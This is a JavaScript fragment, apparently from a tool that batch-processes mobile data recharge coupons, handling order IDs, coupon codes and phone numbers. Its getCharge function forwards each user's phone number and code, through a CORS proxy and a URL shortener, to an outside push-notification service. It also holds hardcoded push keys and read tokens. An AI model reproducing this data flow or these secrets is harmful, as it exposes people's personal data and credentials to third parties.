  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    //$("#yql").text("正在获取...");
 //    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 4){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[3].trim());
      $("#enc").val(pre[2].trim());
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    var enc = $("#enc").val().trim();
    if(mobile && orderId && enc){

      // var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      //var u = "http://ms.lefone.cn/msflowday/couponShowController/generateCheckCode?enStr=Ko8GEZulztYGzlwL41zvKHByrFzWvp51AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk=&mobile=" + mobile;
      getCharge();
	    
	    //      $.ajax({
 //          url: "https://query.yahooapis.com/v1/public/yql",
 //          dataType: "json",
 //          timeout: 10000,
 //          data: {
 //              format: "json",
 //              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
 //          },
 //          success: getUrl,
 //          error: function(c, u) {
 //              alert("错误 如果多次尝试无果请联系开发者");
 //              $("#yql").removeAttr("disabled");
 //          }
 //      });
		//$("#frame").attr("src", u);
		//$("#yql").text("如果黄色框文字中包含true表示验证码发送成功 点击可以重发验证码");
	    	//$("#yql").attr("onclick", "getEnc(true)");
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      $("#yql").text("验证码获取成功 请稍后填写");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}

var getRandom = function(){
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 3; i > 0; i--) {
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	};
	if(used.indexOf(text) == -1){
		used.push(text);
		return text;
	}else{
		return getRandom();
	}
}

var clear = function(){
	$("#mobile").val("");
	$("#code").val("");
	$("#orderId").val("");
	$("#rand").val("");
	$("#enc").val("");
	$("#yql").attr("onclick", "getEnc()");
}

var getCharge = function(){
	var mobile = $("#mobile").val().trim();
	var code = $("#code").val().trim();
	var orderId = $("#orderId").val().trim();
	var enc = $("#enc").val().trim();
	//var rand = $("#rand").val().trim();
	//if(rand){
		usedList.push(orderId + "@" + code + "@" + enc + "@");
	  	rest--;
		localStorage.used = usedList;
		//localStorage.rm = used;
		//var str = "UmGdgjarlMgUUcyuaagJoXIIQ3DK44FsD5G00suinyka7hNvFpPqJcBsljrtwJKX2aBuNTC8Jqw%3D";
		//var u = "http://ms.lefone.cn/msflowday/couponShowController/charegeCoupon?enStr=" + str + "&couponCode=" + code + "&mobile=" + mobile + "&chargeType=0&rand=" + rand;
		//var s = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + str; 
	        //var info = "http://ms.lefone.cn/msflowday/couponShowController/getCouponInfo?enStr=" + str;
		var check = "http://sc.ftqq.com/?c=talkadmin&a=hookdetail&readtoken=59bcbf7b76f8d&wid=24674&param=" + btoa(enc + "#" + code + "#" + mobile);
		var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + check;
	        //$("#frame").attr("src", info);
	        //$("#yql").text("请确认黄色框中显示乱码 否则【记录码子并刷新后】再点我一次");
		var extra = " 当前" + orderId + " 剩余" + rest;
		
		//$("#frame").attr("src", u);
		$.ajax({
		    url: "http://cors-proxy.htmldriven.com",
		    dataType: "json",
		    timeout: 10000,
		    data: {
			url: "http://www.xiaoxiangzi.com/tool/dwz.asp?domain=" + encodeURIComponent(check)
		    },
		    success: function(dt) {
			var newResult = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + dt.body;
			$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=服务端流量充值"+extra+"&desp=" + newResult)
		    }
		});
		$("#result").val(result);
		//$("#charge").text("请看黄色框中充值结果");
	//}else{
		//alert("缺少验证码");
	//}
}
